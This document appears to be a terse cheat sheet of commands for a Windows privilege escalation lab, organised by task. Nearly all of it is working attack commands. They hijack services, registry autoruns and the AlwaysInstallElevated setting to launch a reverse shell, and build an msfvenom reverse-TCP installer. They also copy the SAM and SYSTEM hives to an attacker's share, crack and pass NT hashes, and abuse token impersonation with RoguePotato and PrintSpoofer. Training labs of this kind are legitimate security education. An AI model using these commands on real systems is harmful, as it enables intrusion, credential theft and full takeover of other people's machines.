# Task 1 Service Exploits - Insecure Service Permissions
```
accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
net start daclsvc
```

# Task 2 Service Exploits - Unquoted Service Path
```
sc qc unquotedsvc 
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
```

# Task 3 Service Exploits - Weak Registry Permissions
```
sc qc regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```

# Task 4 Service Exploits - Insecure Service Executables
```
sc qc filepermsvc
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc
```

# Task 5 Registry - AutoRuns
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
*- REBOOT -*
rdesktop 10.10.67.19
```

# Task 6 Registry - AlwaysInstallElevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=53 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

# Task 7 Passwords - Registry
```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
winexe -U 'admin%password' //10.10.67.19 cmd.exe
```

# Task 8 Passwords - Saved Creds
```
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

# Task 9 Passwords - Security Account Manager (SAM)
```
copy C:\Windows\Repair\SAM \\10.8.59.239\kali\
copy C:\Windows\Repair\SYSTEM \\10.8.59.239\kali\
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
john --format=NT hash.txt -w=/usr/share/wordlists/rockyou.txt
```

# Task 10 Passwords - Passing the Hash
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::' //$IP cmd.exe
```

# Task 11 Scheduled Tasks
```
type C:\DevTools\CleanUp.ps1 
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
echo C:\PrivEsc\reverse.exe  C:\DevTools\CleanUp.ps1
```

# Task 12 Insecure GUI Apps
```
tasklist /V | findstr mspaint.exe
file://c:/windows/system32/cmd.exe
```

# Task 13 Startup Apps
```
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cscript C:\PrivEsc\CreateShortcut.vbs
rdesktop -u admin 10.10.67.19
```

# Task 14 Token Impersonation - Rogue Potato
```
sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.67.19:9999
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```

# Task 15 Token Impersonation - PrintSpoofer
```
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

# Task 16 Privilege Escalation Scripts 
```
winPEASany.exe
Seatbelt.exe
PowerUp.ps1
SharpUp.exe
nishang.ps1
```